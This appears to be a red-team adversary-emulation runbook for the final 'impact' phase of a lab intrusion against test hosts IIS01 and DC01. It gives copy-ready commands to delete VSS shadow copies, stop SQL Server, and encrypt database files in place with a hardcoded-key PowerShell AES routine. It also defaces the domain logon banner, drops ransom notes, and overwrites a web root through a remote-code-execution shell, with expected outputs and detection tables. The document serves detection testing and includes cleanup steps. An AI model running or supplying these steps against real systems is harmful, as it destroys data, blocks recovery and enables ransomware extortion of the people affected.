> Impact

# Phase 5 — Impact: Data Encryption and Internal Defacement

## Overview

Phase 5 runs after Phase 4 collection and exfiltration are complete. Having exfiltrated
`ntds.dit`, registry hives, and IIS web configuration files, the operator executes the
final impact stage in two sequential steps:

**Step 1** targets IIS01 with three chained behaviors from the SYSTEM dnscat2 session
established in Phase 1: VSS shadow deletion prevents volume snapshot recovery, the
MSSQL service is stopped to release exclusive file locks, and the `UploadPortalDB`
database files are encrypted in place with AES-256.

**Step 2** announces the intrusion through two independent defacement channels — the
Windows domain logon banner on DC01 and the upload portal web root on IIS01 — using
the `TESTLAB\Administrator` dnscat2 session on DC01 (Phase 3) and the
`IIS APPPOOL\react.testlab.local` react2shell HTTP shell on IIS01 (Phase 1).

No new payloads or lateral movement are required. Two delivery options exist for Step 1:
**Option A** (primary) uses `impact.exe` — a pre-compiled binary that consolidates
VSS deletion, service control, and encryption into a single process via direct Windows
API calls. **Option B** (alternative) delivers the encryption routine as a single-line
`powershell -Command "..."` string through the dnscat2 shell.

| Step | Host | Session | Techniques |
| - | - | - | - |
| Step 0 | — | — | Session verification |
| Step 1 | IIS01 | NT AUTHORITY\SYSTEM dnscat2 (IIS01) | T1490, T1489, T1486 |
| Step 2 | DC01 + IIS01 | TESTLAB\Administrator dnscat2 (DC01) + react2shell (IIS01) | T1491.001, T1112 |

---

## Step 0 — Setup

### Procedures

- Verify the IIS01 SYSTEM dnscat2 C2 session is active

  ```text
  dnscat2> windows
  ```

  - ***Expected Output***

    ```text
    ... Session N: IIS01 (NT AUTHORITY\SYSTEM) ...
    ```

- Verify the DC01 Administrator dnscat2 session is active

  ```text
  dnscat2> windows
  ```

  - ***Expected Output***

    ```text
    ... Session M: DC01 (TESTLAB\Administrator) ...
    ```

- Verify the react2shell HTTP session is reachable

  ```bash
  cd resources/payloads/react2shell-tool
  python -m exploit_tool.main -t http://react.testlab.local
  ```

  - ***Expected Output***

    ```text
    rce >
    ```

---

## Step 1 — Recovery Inhibition, Service Stop, and Data Encryption (IIS01)

### Voice Track

With data safely exfiltrated, the attacker turns to impact on IIS01 using the SYSTEM
dnscat2 session that has persisted since Phase 1. The sequence mirrors real-world
operator-deployed ransomware: remove recovery options, unlock the target files, then
encrypt.

First, `vssadmin.exe` is called to delete all Volume Shadow Copy snapshots on the local
volume. VSS snapshots are the primary fast-recovery path on Windows — removing them
forces the victim to rely on offline backups. With no shadow copies present, restoring
the database to its pre-attack state requires external media.

Next, the `MSSQL$SQLEXPRESS` service is stopped via `sc.exe`. SQL Server holds an
exclusive OS-level file lock on `UploadPortalDB.mdf` and `UploadPortalDB_log.ldf` for
the lifetime of the service. Any attempt to open these files for writing while the
service is running returns `ERROR_SHARING_VIOLATION`. Stopping the service flushes the
buffer pool, checkpoints the database, and releases all file handles cleanly.

Finally, a PowerShell AES-256 CBC encryption routine — delivered as a single
`powershell -Command "..."` line — reads each database file into memory, encrypts it in a
`MemoryStream`, and overwrites the original path with the ciphertext. Both files are
overwritten in place: the filenames and extensions are preserved, but the content is
replaced entirely. The `UploadPortalDB` database is now unreadable by SQL Server or any
recovery tool without the key.

### Procedures

#### Inhibit System Recovery (IIS01 SYSTEM dnscat2)

- ☣️ From the IIS01 SYSTEM dnscat2 shell, delete all VSS shadow copies

  ```text
  C:\ProgramData> vssadmin delete shadows /all /quiet
  ```

  - ***Expected Output***

    ```text
    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
    (C) Copyright 2001-2013 Microsoft Corp.

    Successfully deleted 1 shadow copies.
    ```

    > If no shadow copies exist the output will be `No items found that satisfy the
    > query.` — the command still succeeds (exit 0) and the technique behavior is
    > recorded.

- Verify no shadow copies remain

  ```text
  C:\ProgramData> vssadmin list shadows
  ```

  - ***Expected Output***

    ```text
    No items found that satisfy the query.
    ```

#### Stop MSSQL Service (IIS01 SYSTEM dnscat2)

- ☣️ Stop the SQL Server Express service to release file locks on the database files

  ```text
  C:\ProgramData> sc stop MSSQL$SQLEXPRESS
  ```

  - ***Expected Output***

    ```text
    SERVICE_NAME: MSSQL$SQLEXPRESS
            TYPE               : 10  WIN32_OWN_PROCESS
            STATE              : 3  STOP_PENDING
                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x3
            WAIT_HINT          : 0x7530
    ```

- Verify the service has fully stopped before proceeding

  ```text
  C:\ProgramData> sc query MSSQL$SQLEXPRESS
  ```

  - ***Expected Output***

    ```text
    SERVICE_NAME: MSSQL$SQLEXPRESS
            TYPE               : 10  WIN32_OWN_PROCESS
            STATE              : 1  STOPPED
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x0
            WAIT_HINT          : 0x0
    ```

#### Backup Database Files (IIS01 SYSTEM dnscat2)

- Backup the original database files to `C:\Windows\Temp\` before encryption (for lab restore)

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Copy-Item 'C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf' 'C:\Windows\Temp\UploadPortalDB.mdf.backup'; Copy-Item 'C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB_log.ldf' 'C:\Windows\Temp\UploadPortalDB_log.ldf.backup'"
  ```

  - ***Expected Output***

    ```text
    (no output — files copied silently)
    ```

- Verify backup files exist

  ```text
  C:\ProgramData> dir C:\Windows\Temp\UploadPortalDB*
  ```

  - ***Expected Output***

    ```text
    UploadPortalDB.mdf.backup       <original file size>
    UploadPortalDB_log.ldf.backup   <original file size>
    ```

#### Encrypt Database Files (IIS01 SYSTEM dnscat2)

- ☣️ Execute the AES-256 encryption routine as a single plaintext `-Command` line

  ```text
  C:\ProgramData> powershell -NoProfile -Command "$key=[byte[]](82,97,110,115,111,109,71,114,112,50,48,50,53,33,64,35,36,37,94,38,42,40,41,95,43,61,123,124,125,58,59,34);$iv=[byte[]](73,73,83,48,49,69,110,99,73,86,50,48,50,53,33,64);function enc($p){$b=[IO.File]::ReadAllBytes($p);$a=[Security.Cryptography.AesManaged]::new();$a.Key=$key;$a.IV=$iv;$a.Mode='CBC';$a.Padding='PKCS7';$e=$a.CreateEncryptor();$m=[IO.MemoryStream]::new();$s=[Security.Cryptography.CryptoStream]::new($m,$e,'Write');$s.Write($b,0,$b.Length);$s.FlushFinalBlock();[IO.File]::WriteAllBytes($p,$m.ToArray())};$d='C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA';enc($d+'\UploadPortalDB.mdf');enc($d+'\UploadPortalDB_log.ldf')"
  ```

  > **Key note**: AES-256 key bytes spell `RansomGrp2025!@#$%^&*()_+={|}:;"` (32 bytes),
  > IV bytes spell `IIS01EncIV2025!@` (16 bytes). All string literals inside `-Command`
  > use single quotes — no inner double-quote escaping is needed for `cmd.exe` delivery.

  - ***Expected Output***

    ```text
    (no output — WriteAllBytes overwrites files silently; PowerShell returns to prompt on completion)
    ```

- Verify the database files have been overwritten (sizes will change due to PKCS7 padding on the final block)

  ```text
  C:\ProgramData> dir "C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB*"
  ```

  - ***Expected Output***

    ```text
    UploadPortalDB.mdf       <size in bytes — present but content is ciphertext>
    UploadPortalDB_log.ldf   <size in bytes — present but content is ciphertext>
    ```

- Confirm SQL Server starts but `UploadPortalDB` is inaccessible due to encrypted MDF header

  ```text
  C:\ProgramData> sc start MSSQL$SQLEXPRESS
  C:\ProgramData> sc query MSSQL$SQLEXPRESS
  ```

  - ***Expected Output***

    ```text
    SERVICE_NAME: MSSQL$SQLEXPRESS
            TYPE               : 10  WIN32_OWN_PROCESS
            STATE              : 4  RUNNING
                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x0
            WAIT_HINT          : 0x0
    ```

    > SQL Server service starts normally — it can run with individual databases in a failed
    > state. `UploadPortalDB` will be marked **SUSPECT** or **OFFLINE** internally because
    > the MDF page header is invalid ciphertext. The service itself does not crash.

- (Optional) Verify `UploadPortalDB` state and trigger recovery attempt

  ```text
  C:\ProgramData> sqlcmd -S localhost\SQLEXPRESS -E -C -Q "SELECT name, state_desc FROM sys.databases WHERE name = 'UploadPortalDB'"
  ```

  - ***Expected Output***

    ```text
    name                           state_desc
    ------------------------------ ------------------
    UploadPortalDB                 RECOVERY_PENDING
    ```

- (Optional) Force a recovery pass to confirm encryption destroyed the MDF

  ```text
  C:\ProgramData> sqlcmd -S localhost\SQLEXPRESS -E -C -Q "ALTER DATABASE UploadPortalDB SET ONLINE"
  ```

  - ***Expected Output***

    ```text
    Msg 5181, Level 16, State 5, Server IIS01\SQLEXPRESS, Line 1
    Could not restart database "UploadPortalDB". Reverting to the previous status.
    Msg 5069, Level 16, State 1, Server IIS01\SQLEXPRESS, Line 1
    ALTER DATABASE statement failed.
    Msg 824, Level 24, State 6, Server IIS01\SQLEXPRESS, Line 1
    SQL Server detected a logical consistency-based I/O error: torn page (expected
    signature: 0xffffffff; actual signature: 0x2ce700fb). It occurred during a read of
    page (1:0) in database ID 5 at offset 0000000000000000 in file '...\UploadPortalDB.mdf'.
    Msg 824, Level 24, State 2, Server IIS01\SQLEXPRESS, Line 1
    SQL Server detected a logical consistency-based I/O error: torn page (expected
    signature: 0xaaaaaaaa; actual signature: 0x3d21e612). It occurred during a read of
    page (2:0) in database ID 5 at offset 0000000000000000 in file '...\UploadPortalDB_log.ldf'.
    ```

    > **Error 824 (severity 24)** — torn-page detection failure. SQL Server writes a
    > protection signature into every 512-byte sector of each 8 KB page; AES-CBC
    > overwrites those signatures with ciphertext so the read-back values no longer match.
    > Severity 24 aborts recovery immediately — the database stays in `RECOVERY_PENDING`
    > (not `SUSPECT`) because the recovery pass was never completed. The database is
    > unrecoverable without the AES-256 key.

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Impact | T1490 | Inhibit System Recovery | Windows | Sysmon Event 1 on IIS01: `vssadmin.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) with command line `delete shadows /all /quiet`; process integrity level SYSTEM | Calibrated - Not Benign | `vssadmin.exe` called to delete all VSS shadow copies on IIS01 volume; removes snapshot-based recovery path before database file encryption | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
| Impact | T1489 | Service Stop | Windows | Windows System Event 7036 on IIS01: `MSSQL$SQLEXPRESS` service entered the stopped state; Sysmon Event 1: `sc.exe` with command line `stop MSSQL$SQLEXPRESS` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) | Calibrated - Not Benign | `sc.exe` stops `MSSQL$SQLEXPRESS` to release exclusive OS file locks on `UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; prerequisite for T1486 encryption step | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
| Impact | T1486 | Data Encrypted for Impact | Windows | Sysmon Event 11 on IIS01: `powershell.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) writes to `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; writing process is not a SQL Server service binary — anomalous writer identity for `.mdf`/`.ldf` file extensions | Calibrated - Not Benign | PowerShell AES-256 CBC routine (delivered as single-line `-Command` argument) reads each database file into memory, encrypts with hardcoded key, and overwrites the original path; `UploadPortalDB` becomes unreadable to SQL Server without the decryption key | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |

---

## Step 2 — Impact: Internal Defacement (DC01 + IIS01)

### Voice Track

With the database encrypted and recovery inhibited, the attacker announces the intrusion
through two independent channels — one targeting every domain user, one targeting every
browser that reaches the organisation's internal web applications.

On DC01, the `LegalNoticeCaption` and `LegalNoticeText` registry keys under
`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` are modified to
display a ransom message at the Windows logon screen. These keys are applied
domain-wide: any user logging into any domain-joined machine will see the notice before
their credentials are accepted, because the domain's Group Policy pulls the domain
controller's registry values. Ransom note text files are also dropped at
`C:\Users\Administrator\Desktop` and the `C:\` root so that the message is visible from
any Explorer or shell session on DC01.

On IIS01, the attacker uses the existing react2shell Node.js eval channel to write a
ransom note HTML page directly to the `upload.testlab.local` web root. The AppPool
identity (`IIS APPPOOL\react.testlab.local`) has write access to its own web root, so
no privilege escalation is needed. From this point, any browser navigating to
`http://upload.testlab.local` receives the ransom page instead of the upload portal.

### Procedures

- ☣️ From the DC01 dnscat2 shell, set the logon-screen ransom notice in the registry

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name LegalNoticeCaption -Value '!!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!' -Type String -Force; Set-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name LegalNoticeText -Value 'Your network has been compromised. All data has been exfiltrated and encrypted. To recover your files contact us at: ransomgroup.onion within 72 hours.' -Type String -Force"
  ```

  - ***Expected Output***

    ```text
    (no output — registry values set silently)
    ```

- Verify the registry values were written

  ```text
  C:\ProgramData> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LegalNoticeCaption
  C:\ProgramData> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LegalNoticeText
  ```

  - ***Expected Output***

    ```text
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        LegalNoticeCaption    REG_SZ    !!! ALL YOUR FILES HAVE BEEN ENCRYPTED !!!

    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
        LegalNoticeText    REG_SZ    Your network has been compromised...
    ```

- ☣️ Drop ransom note text files on DC01

  ```text
  C:\ProgramData> powershell -NoProfile -Command "Set-Content 'C:\README_DECRYPT.txt' 'ALL YOUR FILES HAVE BEEN ENCRYPTED. Contact ransomgroup.onion within 72 hours.'; Set-Content 'C:\Users\Administrator\Desktop\README_DECRYPT.txt' 'ALL YOUR FILES HAVE BEEN ENCRYPTED. Contact ransomgroup.onion within 72 hours.'"
  ```

  - ***Expected Output***

    ```text
    (no output — files written silently)
    ```

- ☣️ From the react2shell session on IIS01, write a ransom note HTML page to the upload portal web root

  ```text
  rce > eval "require('fs').writeFileSync('C:\\\\inetpub\\\\upload.testlab.local\\\\index.html', '<html><head><title>ENCRYPTED</title></head><body style=\"background:#000;color:#f00;font-family:monospace;padding:40px\"><h1>!!! YOUR NETWORK HAS BEEN COMPROMISED !!!</h1><p>All files on this network have been encrypted and exfiltrated.</p><p>Contact us at <b>ransomgroup.onion</b> within 72 hours to negotiate decryption.</p></body></html>')"
  ```

  - ***Expected Output***

    ```text
    (no output — file written via eval; react2shell returns empty result on successful fs.writeFileSync)
    ```

- Verify the web defacement from the attacker machine

  ```bash
  curl -s http://upload.testlab.local/ | head -5
  ```

  - ***Expected Output***

    ```text
    <html><head><title>ENCRYPTED</title></head><body style="background:#000;...
    ```

### Reference Tables

| Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
| - | - | - | - | - | - | - | - | - | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 13 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) writes `LegalNoticeCaption` and `LegalNoticeText` string values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`; registry key path matches Windows logon-screen policy | Calibrated - Not Benign | `Set-ItemProperty` modifies `LegalNoticeCaption` and `LegalNoticeText` on DC01 to display a ransom message at domain logon — affects all domain-joined machines drawing policy from this DC | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Defense Evasion | T1112 | Modify Registry | Windows | Sysmon Event 13 on DC01: `powershell.exe` sets `LegalNoticeCaption` (REG_SZ) and `LegalNoticeText` (REG_SZ) under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` via `Set-ItemProperty`; parent process is `RuntimeBroker.exe` ghost | Calibrated - Not Benign | Registry modification implementing the logon-banner defacement; same physical event as T1491.001 above but independently scored as a registry-modification behavior | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) creates `README_DECRYPT.txt` at `C:\` and `C:\Users\Administrator\Desktop\` | Calibrated - Not Benign | `Set-Content` drops ransom note text files at two paths on DC01; file name `README_DECRYPT.txt` matches ransomware ransom-note naming convention | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
| Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on IIS01: `node.exe` (IIS APPPOOL\react.testlab.local) creates `index.html` in `C:\inetpub\upload.testlab.local\` via `fs.writeFileSync` called through react2shell eval channel; HTTP access to `upload.testlab.local/` now returns ransom page | Calibrated - Not Benign | react2shell eval executes `fs.writeFileSync` to overwrite the upload portal landing page with a ransom HTML page on IIS01; no child process spawned — write occurs entirely within `node.exe` | IIS01 (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py eval path](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |

---

## End of Phase

### Procedures

- Record all artifacts created in this phase for cleanup reference (see `Cleanup.md`):
  - `C:\Windows\Temp\UploadPortalDB.mdf.backup` — clean backup on IIS01 (use to restore encrypted .mdf before rerunning Phase 5)
  - `C:\Windows\Temp\UploadPortalDB_log.ldf.backup` — clean backup on IIS01 (use to restore encrypted .ldf before rerunning Phase 5)
  - `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf` — encrypted in place on IIS01 (restore from backup or reinstall MSSQL database)
  - `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB_log.ldf` — encrypted in place on IIS01
  - VSS shadow copies — deleted on IIS01 (cannot restore; recreate with `vssadmin create shadow /for=C:` if needed for future runs)
  - `C:\README_DECRYPT.txt` — ransom note on DC01
  - `C:\Users\Administrator\Desktop\README_DECRYPT.txt` — ransom note on DC01 desktop
  - `C:\inetpub\upload.testlab.local\index.html` — defaced web root on IIS01 (restore original from `resources/setup/file-upload-vuln-web/`)
  - Registry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption` on DC01 (remove or set to empty string)
  - Registry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeText` on DC01 (remove or set to empty string)
